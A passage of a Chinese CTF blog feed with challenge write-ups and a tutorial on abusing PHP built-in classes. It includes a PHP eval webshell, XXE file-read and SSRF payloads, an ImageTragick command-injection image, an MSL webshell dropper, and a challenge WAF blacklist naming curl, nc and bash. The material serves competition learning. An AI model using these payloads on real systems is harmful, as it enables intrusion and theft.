class="hljs-variable">$path</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>文件上传，但是过滤用的是非贪婪过滤</p><p>直接绕过就行</p><p>webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>写个表单上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://challenge.qihangcup.cn:33406/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>蚁剑直接连接就行</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h3><p>gpt直接搜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_message</span>(<span class="hljs-params">encrypted_message_b64, private_key</span>):<br>    <span class="hljs-comment"># Base64解码加密消息</span><br>    encrypted_message = base64.b64decode(encrypted_message_b64)<br>    <span class="hljs-comment"># 导入私钥</span><br>    key = RSA.import_key(private_key)<br>    <span class="hljs-comment"># 创建解密器</span><br>    cipher = PKCS1_OAEP.new(key)<br>    <span class="hljs-comment"># 解密并返回结果</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_message).decode()<br><br><span class="hljs-comment"># 第二个私钥（实际能解密的私钥）</span><br>private_key = <span class="hljs-string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQCvNhcDwDMhZl3dJt0+gkvu/cQuRFM58aqCDRLfS5bnCMPFXFi8</span><br><span class="hljs-string">aHrYZNC7Tz/DrenOSUCv+d+4sZqjRW8GsbOR8DWK7wNO3SliQ8MmiY2jfF5omPaU</span><br><span class="hljs-string">5OJiGUuAYLbYeIUkvEn6Zf10hmwuaGwku5qgEEPppfaUtleFsOFjdYMbnQIDAQAB</span><br><span class="hljs-string">AoGACZwbXgrMIyBUtJz9lICb/pMvj+QSdoKhOfnSl6mzMJ/D8Q60FT1bw4OgCS37</span><br><span class="hljs-string">DtX6lWRiJmS7lwsyspLL2J+lfBuq2PrES/SRcp4TausDemtRfQVbKmBEcfy0oIn3</span><br><span class="hljs-string">DM7dT4EAhUSI2Z4Y6nX+3yztwQV0ReeYdlg2P8eOprftvVcCQQC3kpHbwv9kHa5N</span><br><span class="hljs-string">z49QFV5W1XHCD4KE3wC1xm/9dWbOMrGkR2v7CIXYoRcD6hg4kv5JzKPOaYYpygqZ</span><br><span class="hljs-string">qRR/uWfPAkEA9FcBpiiB1b7Ozxk7Gz6NF94MQItJ0xTrArArllBheAhIjaDAjX1z</span><br><span class="hljs-string">OQ++RGZVByXVLmPyWJNK93uR0tqQOju00wJACjRIjVnCjpMjzEl8Yuw9KUCGKU5p</span><br><span class="hljs-string">Z+9pf7E/KmyrQU0KGOKrevHXVtpliB8sJ4DsR7frZx7wiUQk4LPIYu0wewJBAIQo</span><br><span class="hljs-string">64NsNY3ffw0VoJrD4p0eRZJDxNKfZd42W90Z7R53nIa+hGgDiuc6VLe6ghMzq3NE</span><br><span class="hljs-string">LDksskfaVq2t+oUE9nECQQCptxk0oH5dwDttlWa0esz9V+HdMY4tQlvUuHUwCY9D</span><br><span class="hljs-string">slrK1kk630BceGayC2TYOvfdco7iui5HYIJ4W5ff3RRB</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 第二个加密消息（实际能解密的消息）</span><br>encrypted_msg = <span class="hljs-string">&quot;UpyynVxi3qhqCLRI+lsKnLZ4QrXmUCnmh8fRUR4yHbl49I2CnlwBmKtbOKKcXQCKBMrZ2sedeh7UiVBth5peL0IarRC/GHevnZOF2Bw48E5g5DAzzMsotqnDV0NZpKMuqyXtSeqm9I/gMUKzbPzBtwmmGQ66vCjswrdXghcmUc4=&quot;</span><br><br><span class="hljs-comment"># 解密并输出</span><br>decrypted = decrypt_message(encrypted_msg, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
      <tag>文件包含</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP原生类</title>
    <link href="/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍php常用的原生类</p><p>在php中只要函数名和参数可控，那么使用php原生类会有很大作用</p><blockquote><p>前提：<code>php.ini</code> 中通过 <code>disable_classes</code> 限制</p></blockquote><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>与DirectoryIterator相比具有更好的性能，用法其实是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> 是 PHP 的内置类，继承自 <code>FilesystemIterator</code>，专为 <strong>基于通配符模式（glob）的文件遍历</strong> 设计。它简化了按模式匹配文件的过程，无需手动过滤文件名，适用于快速枚举文件系统或查找特定文件。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接输入通配符使用<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>或者配合路径使用 查找路径下匹配的文件<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> 是 PHP 的内置类，继承自 <code>SplFileInfo</code>，专为 <strong>高效读写文件</strong> 设计。它在 CTF 中常用于 <strong>文件内容读取</strong>、<strong>源码泄露</strong> 和 <strong>特殊协议利用</strong>，尤其是在反序列化或文件操作漏洞场景中</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>配合伪协议读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> 是 PHP 的内置类，用于解析和操作 XML 数据。在 CTF 中，它常被用于 <strong>XXE（XML External Entity）攻击</strong>，通过构造恶意 XML 实体实现 <strong>文件读取</strong>、<strong>SSRF（服务端请求伪造）</strong> 或 <strong>远程代码执行</strong>。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从文件加载</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>可以解析XML实体文件那么可不可以自己写个XML文件实现rce或者任意文件读取呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//配合伪协议读取文件</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// 需要关闭实体加载器限制（PHP &lt; 8.0）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// 输出 /etc/passwd 内容</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//进行ssrf，进行外带等操作</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> 是 PHP 的图像处理扩展，支持多种图像格式的操作。在 CTF 中，它常被用于 <strong>恶意图像利用</strong> 和 <strong>文件读取&#x2F;命令执行</strong></p><blockquote><p>CVE-2016-3714:允许通过恶意图像执行命令，利用本函数</p></blockquote><p>先上传恶意图片</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>在触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// 读取恶意图像</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// 触发命令</span><br></code></pre></td></tr></table></figure><p>MSL 脚本利用</p><p>上传恶意msl文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>触发 MSL 脚本</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// 加载 MSL 脚本</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// 生成 output.php</span><br></code></pre></td></tr></table></figure><p>访问 <code>output.php?cmd=id</code> 即可执行命令</p><p>通过 <code>caption:</code> 协议读取本地文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// 生成包含 Flag 的 PHP 文件</span><br></code></pre></td></tr></table></figure><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="Error和Exception"><a href="#Error和Exception" class="headerlink" title="Error和Exception"></a>Error和Exception</h2><p>对于没有回显的rce可以利用这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// 触发命令执行但是没有回显</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 构造 Error 对象，利用其 __toString 方法</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// 输出命令执行结果</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.24</title>
    <link href="/2025/01/24/2025-1-24/"/>
    <url>/2025/01/24/2025-1-24/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser" class="headerlink" title="DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser"></a>DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a 